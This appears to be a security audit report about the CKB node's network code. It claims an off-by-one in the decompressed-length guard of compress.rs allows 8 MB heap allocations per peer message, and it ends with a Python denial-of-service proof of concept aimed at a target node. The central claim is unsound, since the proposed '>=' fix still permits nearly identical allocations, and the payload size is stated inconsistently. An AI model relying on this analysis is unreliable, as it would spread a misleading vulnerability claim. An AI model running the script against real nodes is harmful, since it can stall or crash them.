### Title
Off-by-One in Decompressed-Length Guard Allows 8 MB Heap Allocation Per P2P Message — (`network/src/compress.rs`)

---

### Summary

The snappy decompression guard in both `LengthDelimitedCodecWithCompress::decode` and `Message::decompress` uses a strict `>` comparison against `MAX_UNCOMPRESSED_LEN` (8 MB). A payload whose `decompress_len()` equals exactly 8 MB passes the guard and causes an 8 MB heap allocation before any application-layer validation. Any unauthenticated peer can craft such a payload cheaply (a few KB of snappy-compressed zeros), send it on any compressed protocol channel, and force the node to allocate 8 MB per message. With the default peer limit, this can sustain hundreds of megabytes to gigabytes of simultaneous heap pressure.

---

### Finding Description

**Root cause — off-by-one in the guard:**

`network/src/compress.rs`, `LengthDelimitedCodecWithCompress::decode`:

```rust
if decompressed_bytes_len > MAX_UNCOMPRESSED_LEN {   // line 235: strictly >
    return Err(io::ErrorKind::InvalidData.into());
}
let mut buf = BytesMut::zeroed(decompressed_bytes_len); // line 242: allocates up to 8 MB
``` [1](#0-0) 

`MAX_UNCOMPRESSED_LEN = 1 << 23 = 8388608`. When `decompressed_bytes_len == 8388608`, the condition `8388608 > 8388608` is `false`, so the guard is bypassed and `BytesMut::zeroed(8388608)` is called. The identical flaw exists in `Message::decompress`:

```rust
if decompressed_bytes_len > MAX_UNCOMPRESSED_LEN {   // line 74
    ...
}
let mut buf = vec![0; decompressed_bytes_len];        // line 81
``` [2](#0-1) [3](#0-2) 

**The decoder always processes compressed frames regardless of `enable_compress`:**

The `enable_compress` flag only gates the *encoder*. The decoder branch at line 232 fires unconditionally on any frame with the compress flag byte set:

```rust
if (data[0] & COMPRESS_FLAG) != 0 {   // line 232 — no enable_compress check
``` [4](#0-3) 

**Frame size does not prevent the attack:**

Snappy compresses 8 MB of repetitive data (e.g., all-zero bytes) to a few hundred bytes — well within every protocol's `max_frame_length`. The largest frame limit is RelayV3 at 4 MB; the compressed form of an 8 MB zero-filled buffer is orders of magnitude smaller. [5](#0-4) 

**Connection limits:**

The tentacle service is configured with `max_connection_number(1024)`: [6](#0-5) 

The default CKB config sets `max_peers = 125`. With 125 simultaneous peers each sending one such message, the node faces 125 × 8 MB = ~1 GB of concurrent heap pressure. With the service-level ceiling of 1024, the upper bound is ~8 GB. [7](#0-6) 

---

### Impact Explanation

Each connected peer can force an 8 MB heap allocation per message at negligible cost (a few-KB compressed frame). If the decompressed content is valid snappy data, the connection is not dropped and the attacker can send messages continuously. With the default peer limit of 125, sustained concurrent sending produces ~1 GB of heap pressure; at the service ceiling of 1024 peers, ~8 GB. This causes OOM kills or severe GC/allocator pressure, crashing or stalling the node and making it unable to participate in block sync or relay.

---

### Likelihood Explanation

The attack requires only a TCP connection to the node's P2P port — no authentication, no stake, no PoW. The crafted payload is trivial to produce (snappy-compress 8 MB of zeros). The off-by-one is a single character difference (`>` vs `>=`) that has survived in both code paths. Any adversary scanning for CKB nodes can execute this with a small script.

---

### Recommendation

Change both guards from strict `>` to `>=`:

```rust
// network/src/compress.rs, line 235
if decompressed_bytes_len >= MAX_UNCOMPRESSED_LEN {

// network/src/compress.rs, line 74
if decompressed_bytes_len >= MAX_UNCOMPRESSED_LEN {
```

Additionally, consider adding per-peer rate limiting on decompression and a node-wide cap on total concurrent decompression memory.

---

### Proof of Concept

```python
import snappy, struct, socket

# 1. Craft payload: 8 MB of zeros, snappy-compressed
raw = b'\x00' * 8388608          # exactly MAX_UNCOMPRESSED_LEN
compressed = snappy.compress(raw) # ~few hundred bytes

# 2. Build frame: [4-byte length][0x80 compress flag][compressed payload]
payload = b'\x80' + compressed
frame = struct.pack('>I', len(payload)) + payload

# 3. Send on any CKB P2P protocol channel (e.g., RelayV3 port)
s = socket.create_connection(('TARGET_IP', 8115))
# ... complete tentacle/secio handshake, then send frame ...
s.sendall(frame)
# Node allocates BytesMut::zeroed(8388608) before any application logic
```

Each such frame causes an 8 MB allocation. Sending from 125 concurrent connections causes ~1 GB of simultaneous heap pressure, triggering OOM on typical node deployments.

### Citations

**File:** network/src/compress.rs (L13-13)
```rust
const MAX_UNCOMPRESSED_LEN: usize = 1 << 23; // 8MB
```

**File:** network/src/compress.rs (L74-81)
```rust
                    if decompressed_bytes_len > MAX_UNCOMPRESSED_LEN {
                        debug!(
                            "The limit for uncompressed bytes len is exceeded. limit: {}, len: {}",
                            MAX_UNCOMPRESSED_LEN, decompressed_bytes_len
                        );
                        Err(io::ErrorKind::InvalidData.into())
                    } else {
                        let mut buf = vec![0; decompressed_bytes_len];
```

**File:** network/src/compress.rs (L232-242)
```rust
                if (data[0] & COMPRESS_FLAG) != 0 {
                    match decompress_len(&data[1..]) {
                        Ok(decompressed_bytes_len) => {
                            if decompressed_bytes_len > MAX_UNCOMPRESSED_LEN {
                                debug!(
                                    "The limit for uncompressed bytes len is exceeded. limit: {}, len: {}",
                                    MAX_UNCOMPRESSED_LEN, decompressed_bytes_len
                                );
                                return Err(io::ErrorKind::InvalidData.into());
                            }
                            let mut buf = BytesMut::zeroed(decompressed_bytes_len);
```

**File:** network/src/protocols/support_protocols.rs (L122-137)
```rust
    pub fn max_frame_length(&self) -> usize {
        match self {
            SupportProtocols::Ping => 1024,                   // 1   KB
            SupportProtocols::Discovery => 512 * 1024,        // 512 KB
            SupportProtocols::Identify => 2 * 1024,           // 2   KB
            SupportProtocols::Feeler => 1024,                 // 1   KB
            SupportProtocols::DisconnectMessage => 1024,      // 1   KB
            SupportProtocols::Sync => 2 * 1024 * 1024,        // 2   MB
            SupportProtocols::RelayV3 => 4 * 1024 * 1024,     // 4   MB
            SupportProtocols::Time => 1024,                   // 1   KB
            SupportProtocols::Alert => 128 * 1024,            // 128 KB
            SupportProtocols::LightClient => 2 * 1024 * 1024, // 2 MB
            SupportProtocols::Filter => 2 * 1024 * 1024,      // 2   MB
            SupportProtocols::HolePunching => 512 * 1024,     // 512 KB
        }
    }
```

**File:** network/src/network.rs (L976-976)
```rust
            .max_connection_number(1024)
```

**File:** network/src/peer_registry.rs (L22-36)
```rust
pub struct PeerRegistry {
    peers: HashMap<SessionId, Peer>,
    // max inbound limitation
    max_inbound: u32,
    // max outbound limitation
    max_outbound: u32,
    // max block-relay only outbound limitation
    // We do not relay tx or addr messages with these peers
    max_outbound_block_relay: u32,
    // Only whitelist peers or allow all peers.
    whitelist_only: bool,
    whitelist_peers: HashSet<PeerId>,
    feeler_peers: HashMap<PeerId, Flags>,
    disable_block_relay_only_connection: bool,
}
```
